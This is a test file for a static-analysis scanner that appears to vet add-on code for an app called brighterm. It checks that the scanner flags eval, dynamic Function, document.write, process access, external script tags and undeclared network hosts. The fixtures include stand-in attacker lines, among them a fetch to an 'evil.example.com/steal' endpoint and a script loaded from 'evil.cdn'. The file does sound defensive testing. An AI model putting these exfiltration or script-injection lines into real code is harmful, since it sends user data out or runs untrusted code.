import { describe, expect, it } from 'vitest'
import {
  extractReferencedHostnames,
  findUndeclaredDomains,
  scanFileForForbiddenPatterns
} from './staticAnalysis'

describe('scanFileForForbiddenPatterns', () => {
  it('flags eval', () => {
    const findings = scanFileForForbiddenPatterns('main.js', 'eval("2+2")')
    expect(findings).toHaveLength(1)
    expect(findings[0].message).toMatch(/eval/)
  })

  it('flags new Function', () => {
    const findings = scanFileForForbiddenPatterns('main.js', 'const f = new Function("return 1")')
    expect(findings.some((f) => f.message.includes('new Function'))).toBe(true)
  })

  it('flags document.write', () => {
    const findings = scanFileForForbiddenPatterns('main.js', 'document.write("<h1>hi</h1>")')
    expect(findings.some((f) => f.message.includes('document.write'))).toBe(true)
  })

  it('flags require and process access', () => {
    const findings = scanFileForForbiddenPatterns('main.js', 'const fs = require("fs"); process.exit(1)')
    expect(findings.some((f) => f.message.includes('require'))).toBe(true)
    expect(findings.some((f) => f.message.includes('process'))).toBe(true)
  })

  it('flags reassigning window.brighterm', () => {
    const findings = scanFileForForbiddenPatterns('main.js', 'window.brighterm = { fake: true }')
    expect(findings.some((f) => f.message.includes('window.brighterm'))).toBe(true)
  })

  it('flags an externally-hosted <script> tag', () => {
    const findings = scanFileForForbiddenPatterns('index.html', '<script src="https://evil.cdn/x.js"></script>')
    expect(findings.some((f) => f.message.includes('external'))).toBe(true)
  })

  it('finds nothing in ordinary, well-behaved code', () => {
    const findings = scanFileForForbiddenPatterns(
      'main.js',
      'async function load() { const v = await window.brighterm.storage.get("x"); return v }'
    )
    expect(findings).toEqual([])
  })
})

describe('extractReferencedHostnames', () => {
  it('extracts a hostname from a fetch call', () => {
    expect(extractReferencedHostnames('fetch("https://api.example.com/data")')).toEqual(['api.example.com'])
  })

  it('strips a port number', () => {
    expect(extractReferencedHostnames('fetch("http://localhost:8080/x")')).toEqual(['localhost'])
  })

  it('extracts from WebSocket and XMLHttpRequest too', () => {
    expect(extractReferencedHostnames('new WebSocket("wss://ws.example.com/socket")')).toEqual(['ws.example.com'])
  })

  it('deduplicates repeated hosts', () => {
    const src = 'fetch("https://api.example.com/a"); fetch("https://api.example.com/b")'
    expect(extractReferencedHostnames(src)).toEqual(['api.example.com'])
  })

  it('returns an empty array when there are no network calls', () => {
    expect(extractReferencedHostnames('const x = 1')).toEqual([])
  })
})

describe('findUndeclaredDomains', () => {
  it('flags a hostname not present in the declared permission list', () => {
    const findings = findUndeclaredDomains(
      [{ path: 'main.js', content: 'fetch("https://evil.example.com/steal")' }],
      ['api.example.com']
    )
    expect(findings).toEqual([{ file: 'main.js', hostname: 'evil.example.com' }])
  })

  it('does not flag a declared domain', () => {
    const findings = findUndeclaredDomains(
      [{ path: 'main.js', content: 'fetch("https://api.example.com/data")' }],
      ['api.example.com']
    )
    expect(findings).toEqual([])
  })

  it('ignores non-JS/HTML files', () => {
    const findings = findUndeclaredDomains(
      [{ path: 'notes.txt', content: 'fetch("https://evil.example.com")' }],
      []
    )
    expect(findings).toEqual([])
  })

  it('is case-insensitive when matching declared domains', () => {
    const findings = findUndeclaredDomains(
      [{ path: 'main.js', content: 'fetch("https://API.Example.com/data")' }],
      ['api.example.com']
    )
    expect(findings).toEqual([])
  })
})
